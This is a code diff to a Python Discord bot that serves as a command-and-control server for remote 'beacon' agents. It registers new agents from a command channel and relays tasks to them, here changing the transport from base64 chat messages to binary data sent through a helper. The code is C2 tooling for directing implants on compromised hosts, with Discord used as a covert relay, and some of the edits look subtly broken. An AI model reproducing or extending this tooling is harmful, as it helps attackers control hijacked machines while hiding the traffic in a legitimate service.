@@ -10,14 +10,14 @@ from time import sleep
 import establishedSession
 import configureStage
 import config
-from threading import Thread
+
 
 # Discord bot token
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
 CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID'))
 
 # Global dictionary to store beacon sessions
-beacons = {}
+sock_beacons = {}
 
 intents = discord.Intents.all()
 intents.messages = True
@@ -72,7 +72,7 @@ async def createConnection(beaconId):
 
 async def sendTask(channel, task, beaconId):
     """
-    Sends a task to the beacon via a Discord message.
+    Sends a task to the beacon via the `sendData` function, which transmits the data as a binary file.
     """
     # Check if the task is None or an empty string
     if task is None or task == "":
@@ -80,16 +80,16 @@ async def sendTask(channel, task, beaconId):
         return  # Early return if there's no task
 
     try:
-        # Encode the task; ensure it’s a string or bytes before encoding
+        # Ensure the task is bytes
         if isinstance(task, str):
-            task = task.encode()  # Convert string to bytes for encoding
+            task = task.encode()  # Convert string to bytes if necessary
 
-        encoded_task = encoder_base64.encode(task)  # This should now work without errors
+        # Call the sendData function from commonutils to send the binary data
+        await commonUtils.sendData(task, beaconId)
 
-        # Send the encoded task in a Discord message
-        await channel.send(f"Task for {beaconId}: {encoded_task.decode()}")  # Decode back to string for sending
     except Exception as e:
         print(f"Error sending task: {e}")
+
 
 
 async def fetchResponse(channel, beaconId):
@@ -101,6 +101,7 @@ async def fetchResponse(channel, beaconId):
             encoded_response = message.content.split(f"{beaconId}:RespForYou: ")[1]
             return encoder_base64.decode(encoded_response)
     return None
+
 
 async def taskLoop(beaconId, channel):
     while True:
@@ -141,21 +142,18 @@ async def on_message(message):
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
     if message.channel.id == CHANNEL_ID:
-        if message.content.startswith("[+] Registering new agent AGENT:"):
-            beaconId = message.content.split("[+] Registering new agent AGENT:")[1].strip()
-            print(f"New agent registered: {beaconId}")
+        beacons = transport_discord.fetchNewBeacons()
 
-            # Start a new task loop for this agent
-            if beaconId not in beacons:
-                print(f"[+] Established new session {beaconId}. Starting task loop.")
-                channel = message.channel
-                sock = createConnection(beaconId)
+        # Start a new task loop for this agent
+        for beaconId in beacons:
+            print(f"[+] Established new session {beaconId}. Starting task loop.")
+            channel = message.channel
+            sock = createConnection(beaconId)
+            # Create a new asyncio task for the taskLoop
+            asyncio.create_task(taskLoop(beaconId, channel))
 
-                # Create a new asyncio task for the taskLoop
-                asyncio.create_task(taskLoop(beaconId, channel))
-
-                # Store the socket in the beacons dictionary
-                beacons[beaconId] = sock
+            # Store the socket in the beacons dictionary
+            sock_beacons[beaconId] = sock
 
 def main():
     # Argparse for certain options
